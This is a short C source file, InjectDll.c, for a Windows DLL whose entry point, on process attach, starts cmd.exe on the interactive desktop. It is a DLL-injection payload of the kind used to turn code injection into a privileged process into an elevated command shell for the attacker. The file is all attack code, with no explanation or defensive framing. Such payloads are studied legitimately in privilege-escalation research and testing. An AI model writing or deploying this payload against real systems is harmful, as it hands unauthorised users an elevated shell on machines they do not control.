// InjectDll.c
#include <Windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
{
    if (ul_reason_for_call == DLL_PROCESS_ATTACH)
    {
        STARTUPINFOW si = { sizeof(si) };
        PROCESS_INFORMATION pi;
        si.lpDesktop = L"WinSta0\\Default";  // interactive window station

        if (CreateProcessW(L"C:\\Windows\\System32\\cmd.exe",
            NULL, NULL, NULL, FALSE,
            CREATE_NEW_CONSOLE,
            NULL, NULL, &si, &pi))
        {
            CloseHandle(pi.hThread);
            CloseHandle(pi.hProcess);
        }
    }
    return TRUE;
}